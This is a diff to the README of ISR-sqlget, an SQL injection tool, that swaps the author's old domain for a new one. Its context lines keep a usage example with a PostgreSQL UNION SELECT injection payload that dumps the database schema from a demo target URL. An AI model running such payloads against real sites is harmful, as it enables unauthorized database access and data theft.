@@ -1,5 +1,5 @@
 -- ISR - Infobyte Security Research
--- | ISR-sqlget | www.infobyte.com.ar |
+-- | ISR-sqlget | www.infobytesec.com |
 
 
 ..:: DESCRIPTION
@@ -77,7 +77,7 @@ The possible ACTIONs are:
 ..::Example: 
 
 Target:
-http://target.infobyte.com.ar/helloworld.php?id=<SQL-INJECT>
+http://target.infobytesec.com/helloworld.php?id=<SQL-INJECT>
 
 helloworld.php source:
 <?
@@ -106,7 +106,7 @@ Get the database schema:
 ; Action: Get dbschema, Session name: helloworld
 ; --------------------------------------------------
 ; 
-; http://target.infobyte.com.ar/helloworld.php?id=,id=1  union select 1,COALESCE((select nspname from pg_namespace 
+; http://target.infobytesec.com/helloworld.php?id=,id=1  union select 1,COALESCE((select nspname from pg_namespace 
 ; where a.relnamespace =pg_namespace.oid),'0'::text)||'[__]'||COALESCE(relname,'0'::text)||'[__]'||COALESCE(attname,'0'::text);
 ; ||'[__]'||COALESCE((select typname from pg_type where oid=b.atttypid),'0'::text) from (pg_attribute b JOIN pg_class a ON 
 ; (a.oid = b.attrelid)) where (attnum > 0 and ((a.relkind = 'r'::"char") OR (a.relkind = 's'::"char")))  --'
@@ -380,8 +380,8 @@ $conf::gcolumn=0; #0= don't graph column 1= graph columns
 
 ..:: DOWNLOAD
 
-http://www.infobyte.com.ar/development.html
+http://www.infobytesec.com/development.html
 
 ..:: AUTHOR
 Francisco Amato
-famato+at+infobyte+dot+com+dot+ar
+famato+at+infobytesec+dot+com
